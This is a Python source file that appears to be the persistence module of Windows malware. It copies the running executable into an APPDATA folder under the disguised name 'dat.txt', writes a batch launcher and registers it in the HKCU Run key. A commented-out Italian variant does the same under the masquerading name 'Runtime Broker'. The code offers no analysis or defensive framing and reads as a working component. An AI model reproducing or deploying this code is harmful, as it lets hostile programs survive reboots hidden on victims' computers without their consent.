import subprocess
import os
import shutil
import sys


class Startup:
    def __init__(self) -> None:
        self.working_dir = os.getenv("APPDATA") + "\\provavusa"

        if self.check_self():
            return

        self.mkdir()
        self.write_stub()
        self.regedit()

    def check_self(self) -> bool:
        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
            return True

        return False

    def mkdir(self) -> str:
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)

        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)

    def write_stub(self) -> None:
        shutil.copy2(os.path.realpath(sys.executable),
                     self.working_dir + "\\dat.txt")

        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")

    def regedit(self) -> None:
        subprocess.run(args=[
                       "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vusa", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "vusa", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)

"""
import os
import shutil
import subprocess
import sys

def add_to_startup():
    # Percorso dell'eseguibile corrente
    exe_path = sys.executable
    
    # Percorso della cartella Runtime Broker in AppData
    runtime_broker_path = os.path.join(os.getenv('APPDATA'), 'Runtime Broker')
    
    # Verifica se la cartella Runtime Broker esiste già
    if not os.path.isdir(runtime_broker_path):
        os.mkdir(runtime_broker_path)

    else:
        shutil.rmtree(runtime_broker_path)
        os.mkdir(runtime_broker_path)

    # Copia l'eseguibile corrente nella cartella Runtime Broker
    shutil.copy2(exe_path, runtime_broker_path)

    subprocess.run(args=[
                       "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Runtime Broker", "/f"], shell=True)
    subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Runtime Broker", "/t", "REG_SZ", "/d", f"{runtime_broker_path}\\run.bat", "/f"], shell=True)
"""